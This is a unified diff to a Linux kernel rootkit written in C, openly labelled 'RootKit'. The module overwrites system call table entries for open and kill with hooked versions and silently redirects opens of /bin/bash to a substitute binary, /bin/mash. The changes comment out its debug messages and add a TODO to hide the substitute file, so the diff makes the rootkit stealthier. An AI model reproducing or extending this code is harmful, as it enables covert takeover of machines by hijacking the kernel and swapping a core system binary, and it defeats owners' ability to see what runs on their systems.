@@ -26,7 +26,6 @@ orig_open_t orig_open;
 
 
 #define FILE_FROM "/bin/bash"
-//#define FILE_TO "/bin/bash"
 #define FILE_TO "/bin/mash"
 
 //function to get the address of the system call table
@@ -223,7 +222,7 @@ hacked_open(const char *path,int flags,mode_t mode){
 
 	bash_path = filp_open(FILE_FROM,O_PATH,0);
 	if(!bash_path){
-			printk("RootKit open error");
+			//printk("RootKit open error");
 			return ret;
 	}
 
@@ -239,7 +238,7 @@ hacked_open(const char *path,int flags,mode_t mode){
 		ret = orig_open(path,flags,mode);
 		copy_to_user(path,buff,sizeof(FILE_TO));
 
-		printk("Reopen %d\n",ret);
+		//printk("Reopen %d\n",ret);
 	}
 	//printk("Result:%d\n",redir);
 	return ret;
@@ -303,6 +302,8 @@ RootKit_init(void)
 	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
 	__sys_call_table[__NR_open] = (unsigned long)hacked_open;
 	protect_memory();
+
+	/* TODO: hide file FILE_TO */
 
 	return 0;
 }
